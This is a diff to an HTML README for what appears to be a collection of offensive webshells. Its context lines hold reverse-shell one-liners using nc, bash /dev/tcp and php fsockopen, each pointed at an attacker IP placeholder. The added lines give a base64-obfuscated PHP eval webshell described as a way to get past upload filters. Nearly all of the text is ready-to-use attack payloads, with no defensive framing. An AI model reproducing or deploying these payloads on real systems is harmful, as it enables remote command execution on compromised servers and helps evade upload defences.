@@ -1,4 +1,4 @@
-<h3 align='center'><b> rev+shell.php </b></h3>
+<h3 align='center'><b> rev_shell.php </b></h3>
  <p>A simple python reverse shell
 <h3 align='center'><b> shell_with_curl.php </b></h3> 
  <p>A simple webshell check by curl command to that file in victim url directory
@@ -16,3 +16,6 @@
    <pre><code>nc -e /bin/bash &lt;ATTACKER_IP> &lt;ATTACKER_PORT></code></pre>
    <pre><code>bash -i >& /dev/tcp/&lt;ATTACKER_IP>/&lt;ATTACKER_PORT> 0>&1</code></pre>
    <pre><code>php -r '$sock=fsockopen("&lt;ATTACKER_IP>",&lt;ATTACKER_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+
+<h3>Probably can bypass filters while upload, for example.</h3>
+ <pre><code>&lt;?=eval(base64_decode('ZWNobyBzaGVsbF91eGVjKCRfR0VUWydjbWQnXS4nIDI+JjEnKTs='));?></code></pre>
